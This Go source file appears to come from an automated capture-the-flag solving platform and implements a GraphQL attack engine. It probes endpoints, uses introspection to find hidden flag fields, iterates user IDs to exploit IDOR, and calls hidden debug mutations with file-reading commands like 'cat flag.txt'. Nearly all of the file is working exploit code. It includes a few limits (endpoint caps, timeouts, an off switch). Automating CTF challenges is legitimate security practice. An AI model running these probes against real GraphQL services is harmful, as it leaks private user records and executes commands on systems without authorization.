package ctfplatform

// GraphQL 攻击引擎（第 10 基准集）。
//
// 三类真实高频 GraphQL 漏洞：
//  1. 内省泄露：__schema 列出未公开字段（secretFlag 类）→ 直接查询取值
//  2. IDOR：user(id:"N") 遍历 id 取管理员记录（notes 等敏感字段携带 flag）
//  3. 隐藏调试 mutation：内省发现 execCmd(cmd) 类调试入口 → 真实读文件命令
//
// 端点发现：题目线索 > 常见 GraphQL 路径。安全约束：单次 ≤3 端点、
// 每 URL 30s、仅 http/https、SECAUTOMIND_WEB_EXPLOIT=0 可关。

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

var gqlCommonPaths = []string{"/graphql", "/api/graphql", "/graphiql", "/v1/graphql", "/query"}

// gqlIntrospectQuery 拉取全 schema 概览（query + mutation 字段名）。
const gqlIntrospectQuery = `{ __schema { queryType { fields { name } } } }`

var gqlIntrospectMutationQuery = `{ __schema { mutationType { fields { name } } } }`

// gqlHiddenFieldNames 内省结果里值得直接试查的隐藏字段名。
var gqlHiddenFieldNames = []string{"secretFlag", "flag", "hiddenFlag", "debugFlag", "allFlags"}

// gqlUserIDs IDOR 遍历序：先普通用户拿字段形状，再试管理员 id。
var gqlUserIDs = []string{"1", "2", "0", "100", "admin"}

var (
	reGQLFieldName  = regexp.MustCompile(`"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_]*)"`)
	reGQLExecCmd    = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)
	reGQLFlagInText = regexp.MustCompile(`(?i)[a-z0-9_]*flag[a-z0-9_]*\{[^}\x00-\x1f]{3,}\}`)
)

// gqlAttackFromText 生产求解器入口：从题目文本发起 GraphQL 攻击。
func gqlAttackFromText(ctx context.Context, text string) []string {
	if strings.EqualFold(os.Getenv("SECAUTOMIND_WEB_EXPLOIT"), "0") {
		return nil
	}
	cl := webClient(8 * time.Second)
	hints := ParseWebHints(text)

	seen := map[string]bool{}
	var out []string
	attack := func(base string) {
		base = strings.TrimRight(base, "/")
		if base == "" || seen[base] {
			return
		}
		seen[base] = true
		tctx, cancel := context.WithTimeout(ctx, 40*time.Second)
		defer cancel()
		for _, f := range ExploitGraphQLTarget(tctx, cl, base, hints) {
			out = append(out, f)
		}
	}
	for _, m := range reHTTPURL.FindAllString(text, 4) {
		u := strings.TrimRight(m, ".,;:)]}>\"'")
		attack(u)
		if len(out) > 0 {
			return out
		}
	}
	return out
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "graphql_probe", Category: CategoryWebS, Priority: 28,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return gqlAttackFromText(ctx, text)
		},
	})
}

// ExploitGraphQLTarget 对单个靶机执行 GraphQL 三连攻击，返回 flag 形状命中。
func ExploitGraphQLTarget(ctx context.Context, cl *http.Client, baseURL string, hints WebHints) []string {
	base := strings.TrimRight(baseURL, "/")

	eps := []string{}
	seen := map[string]bool{}
	add := func(p string) {
		if p == "" {
			return
		}
		if !strings.HasPrefix(p, "/") {
			p = "/" + p
		}
		p = strings.SplitN(p, "?", 2)[0]
		if !seen[p] && len(eps) < 3 {
			seen[p] = true
			eps = append(eps, p)
		}
	}
	for _, ep := range hints.Endpoints {
		low := strings.ToLower(ep)
		if strings.Contains(low, "graphql") || strings.Contains(low, "graphiql") {
			add(ep)
		}
	}
	for _, p := range gqlCommonPaths {
		add(p)
	}

	var out []string
	flagSeen := map[string]bool{}
	collect := func(f string) {
		if f != "" && !flagSeen[f] {
			flagSeen[f] = true
			out = append(out, f)
		}
	}
	for _, ep := range eps {
		select {
		case <-ctx.Done():
			return out
		default:
		}
		gURL := base + ep
		// 探活：仅连接失败跳过（GraphQL 端点对 GET 常回 405/400）
		if code, _ := httpQuickGet(ctx, cl, gURL); code == 0 {
			continue
		}
		// ---- 1) 内省：发现 query/mutation 两侧可用字段 ----
		qNames := gqlIntrospectFields(ctx, cl, gURL, gqlIntrospectQuery)
		mNames := gqlIntrospectFields(ctx, cl, gURL, gqlIntrospectMutationQuery)

		// ---- 2) 隐藏字段直查 ----
		for _, name := range gqlHiddenFieldNames {
			if !gqlIn(qNames, name) {
				continue
			}
			resp := gqlPost(ctx, cl, gURL, "{ "+name+" }")
			collect(gqlExtractFlag(resp))
			if len(out) > 0 {
				return out
			}
		}

		// ---- 3) IDOR：遍历 user(id) 取管理员敏感字段 ----
		// 内省被关闭/无结果时同样尝试——真实站点常见默认查询名。
		if gqlIn(qNames, "user") || len(qNames) == 0 {
			for _, id := range gqlUserIDs {
				resp := gqlPost(ctx, cl, gURL,
					`{ user(id:"`+id+`") { name role notes email description comment } }`)
				collect(gqlExtractFlag(resp))
				if len(out) > 0 {
					return out
				}
			}
		}

		// ---- 4) 隐藏调试 mutation：execCmd 真实读文件 ----
		for _, name := range mNames {
			if !reGQLExecCmd.MatchString(name) {
				continue
			}
			low := strings.ToLower(name)
			if !strings.Contains(low, "exec") && !strings.Contains(low, "cmd") &&
				!strings.Contains(low, "run") && !strings.Contains(low, "debug") {
				continue
			}
			for _, cmd := range []string{"cat flag.txt", "type flag.txt", "cat ./flag.txt"} {
				resp := gqlPost(ctx, cl, gURL,
					`mutation { `+name+`(cmd:"`+cmd+`") }`)
				collect(gqlExtractFlag(resp))
				if len(out) > 0 {
					return out
				}
			}
		}
	}
	return out
}

// gqlIntrospectFields 发送内省查询并解析字段名列表。
func gqlIntrospectFields(ctx context.Context, cl *http.Client, gURL, query string) []string {
	resp := gqlPost(ctx, cl, gURL, query)
	var names []string
	for _, m := range reGQLFieldName.FindAllStringSubmatch(resp, -1) {
		names = append(names, m[1])
	}
	return names
}

func gqlIn(names []string, want string) bool {
	for _, n := range names {
		if n == want {
			return true
		}
	}
	return false
}

// gqlPost 发送 GraphQL JSON 请求，返回原始响应文本。
func gqlPost(ctx context.Context, cl *http.Client, gURL, query string) string {
	payload, err := json.Marshal(map[string]string{"query": query})
	if err != nil {
		return ""
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, gURL, bytes.NewReader(payload))
	if err != nil {
		return ""
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := cl.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		io.Copy(io.Discard, io.LimitReader(resp.Body, 1<<10))
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<18))
	return string(body)
}

// gqlExtractFlag 从 GraphQL 响应里抽 flag（经反误报复核）。
func gqlExtractFlag(resp string) string {
	for _, m := range reGQLFlagInText.FindAllString(resp, -1) {
		if bfxCandidateClean(m) {
			return m
		}
	}
	return ""
}
